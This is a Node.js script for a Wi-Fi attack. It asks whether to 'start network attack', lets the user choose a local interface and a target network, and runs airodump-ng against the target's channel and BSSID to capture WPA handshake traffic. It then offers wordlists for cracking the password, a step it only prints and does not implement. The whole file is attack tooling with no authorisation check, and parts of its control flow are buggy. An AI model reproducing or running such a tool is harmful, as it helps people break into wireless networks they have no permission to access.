const ifconfig = require('wireless-tools/ifconfig')
const fs = require('fs')
const path = require('path')
const airodump = require('./airodump-ng')
const exampleCommand = require('./exampleCommand')

const saveNetworks = networks => {
    const myData = JSON.stringify(networks)
    fs.writeFile("./tmp/networks.json", myData, function (err) {
        if (err) {
            return console.log(err)
        }
    })
    networks.map((item, index) => {
        console.log(index + 1 + '. ' + item.interface.replace(':', ''))
    })
}

const prompt = (question, callback) => {
    let stdin = process.stdin,
        stdout = process.stdout
    stdin.resume()
    stdout.write(question)

    stdin.once('data', function (data) {
        callback(data.toString().trim())
    })
}

const readFile = () => {
    return fs.readFileSync(path.join(__dirname, 'tmp/networks.json'), { encoding: 'utf8' })
}

new Promise((resolve, reject) => {
    prompt('Start network attack? (y: yes, n: no)? ', input => {
        if (input === 'y') {
            console.log('\r\nAvailable network interfaces:\r\n')
            ifconfig.status((err, status) => {
                saveNetworks(status)
                resolve()
            })
        } else {
            process.exit()
        }
    })
}).then(() => {
    return new Promise((resolve) => {
        prompt('\r\nChoose the number of your wifi modem interface:\r\n', input => {
            const res = input.replace('.', '')
            const networks = readFile()
            const selected = JSON.parse(networks.toString())[res - 1].interface.replace(':', '')
            console.log('\r\nYou have choosen: ' + selected)
            setTimeout(exampleCommand.status((err, status) => {
                console.log(status)
                resolve()
            }, 'airodump-ng ' + selected + ' test.txt'), 60000);
            resolve(selected)
        })
    })
}).then((selected) => {
    return new Promise((resolve) => {
        console.log('\r\nAvailable networks for the attack:\r\n')
        airodump.getEssids().map((item, index) => console.log(index + 1 + '. ' + item))

        prompt('\r\nChoose the number of your target network:\r\n', input => {
            const res = input.replace('.', '')
            const network = airodump.getSelectedNetwork(airodump.getEssids()[res - 1])
            const command = 'airodump-ng ' + selected + ' -c ' + network[0].channel + ' --bssid ' + network[0].BSSID + ' -w wpastream'
            //const command = 'git status'
            console.log('\r\nExecute command: ' + command + '\r\n')
            resolve(command)
        })
    })
}).then((command) => {
    return new Promise((resolve) => {
        exampleCommand.status((err, status) => {
            console.log(status)
            resolve()
        }, command);
    })
}).then(() => {
    console.log('\r\nOperation successful. Available password lists:\r\n\r\n1. 100.000 most common\r\n2. 1000.000 words')
    prompt('\r\nChoose the number of your choice:\r\n', input => {
        const res = input.replace('.', '')
        const words = ['100.000 most common', '1000.000 words']
        console.log('\r\nYou have choosen: ' + words[res - 1])
    })
})

//airodump-ng wlan0 -c [channel of access point] --bssid [mac of access point] -w wpastream
